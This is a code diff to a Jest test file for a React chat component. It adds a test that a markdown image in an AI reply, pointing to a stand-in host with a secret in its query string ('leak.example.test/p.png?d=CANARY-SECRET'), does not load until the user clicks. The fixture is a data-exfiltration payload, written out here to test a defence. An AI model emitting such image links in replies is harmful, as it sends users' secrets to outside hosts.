@@ -32,7 +32,20 @@ jest.mock("posthog-js", () => ({
 
 jest.mock("react-markdown", () => ({
   __esModule: true,
-  default: ({ children }: { children: React.ReactNode }) => <>{children}</>,
+  // An image in the text renders through components.img, as react-markdown renders it, so a test sees
+  // what a reply would show. With no override the plain <img> appears, and the image guard fails.
+  default: ({ children, components }: { children?: React.ReactNode; components?: Record<string, React.ElementType> }) => {
+    const text = typeof children === "string" ? children : "";
+    const image = /!\[([^\]]*)\]\(([^)\s]+)\)/.exec(text);
+    if (!image) return <>{children}</>;
+    const Img = components?.img ?? "img";
+    return (
+      <>
+        {text.slice(0, image.index)}
+        <Img src={image[2]} alt={image[1]} />
+      </>
+    );
+  },
 }));
 
 jest.mock("remark-gfm", () => ({
@@ -1282,6 +1295,31 @@ describe("HivraChat", () => {
     );
     expect(container.querySelector("img")).toBeNull();
     expect(screen.getByRole("button", { name: /chart/ })).toHaveTextContent("leak.example.test");
+  });
+
+  it("renders no remote image in a chat reply until the owner clicks it, and no request leaves the page", async () => {
+    const read = jest.fn()
+      .mockResolvedValueOnce(eventChunk(
+        { type: "_run", runId: "img", detached: true },
+        replyText("Here is the chart: ![chart](https://leak.example.test/p.png?d=CANARY-SECRET)"),
+        { type: "_done", code: 0 },
+      ))
+      .mockResolvedValue({ done: true, value: undefined });
+    const fetchMock = jest.fn().mockResolvedValue(chatResponse(read));
+    global.fetch = fetchMock as unknown as typeof fetch;
+    const { container } = render(
+      <HivraChat boxUrl="https://box.example.com" storageKey="image-reply" token="box-token" agentName="Atlas" agentKind="claude" />,
+    );
+    await screen.findByText("Atlas here, ready to grow the SaaS.");
+    await sendMessage("show me the chart");
+    await screen.findByText(/Here is the chart/);
+    expect(container.querySelector("img")).toBeNull();
+    const placeholder = screen.getByRole("button", { name: /chart/ });
+    expect(placeholder).toHaveTextContent("leak.example.test");
+    expect(fetchMock.mock.calls.some(([url]) => String(url).includes("leak.example.test"))).toBe(false);
+
+    fireEvent.click(placeholder);
+    expect(container.querySelector("img")).toHaveAttribute("src", "https://leak.example.test/p.png?d=CANARY-SECRET");
   });
 
   it("runs several chats at once and routes each stream to the chat that started it", async () => {
